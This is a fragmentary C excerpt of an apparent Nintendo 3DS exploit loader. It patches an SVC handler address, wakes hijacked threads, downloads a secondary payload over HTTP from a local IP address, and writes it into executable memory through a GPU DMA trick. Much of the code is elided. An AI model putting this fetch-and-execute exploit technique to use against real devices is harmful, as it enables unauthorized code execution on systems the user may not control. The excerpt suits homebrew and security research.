...
int _main()
{
	...
	Result (*_DSP_RegisterInterruptEvents)(Handle* handle, u32 a, u32 b, u32 c)=(void*)0x002AED20;
	...
	//close threads
		...
		*((u32*)(0x356208+0x10+4*0x4))=0x002ABEDC; //svc 0x9 addr
		...
		//wake threads
		svcArbitrateAddress(*addressArbiterHandle, 0x35811c, 0, -1, 0);
		svcSignalEvent(((Handle*)0x3480d0)[2]);
		s32 out; svcReleaseSemaphore(&out, *(Handle*)0x357490, 1);
	...
	//ret=_HTTPC_CreateContext(httpcHandle, CN_NINJHAX_URL FIRM_VERSION "_" CN_VERSION "_" SPIDER_VERSION "_" RO_VERSION ".bin", &httpContextHandle);
	ret=_HTTPC_CreateContext(httpcHandle, "http://192.168.1.240/legohax.bin", &httpContextHandle);
	...
	ret=_HTTPC_ReceiveData(httpcHandle2, httpContextHandle, buffer0, 0x300000);
	if(ret)*(u32*)NULL=0xC0DE0005;
	ret=_HTTPC_GetDownloadSizeState(httpcHandle2, httpContextHandle, &secondaryPayloadSize);
	...
	doGspwn((u32*)(buffer1), (u32*)computeCodeAddress(CN_3DSX_LOADADR-0x00100000), 0x0000D000);

	svcSleepThread(0x3B9ACA00);
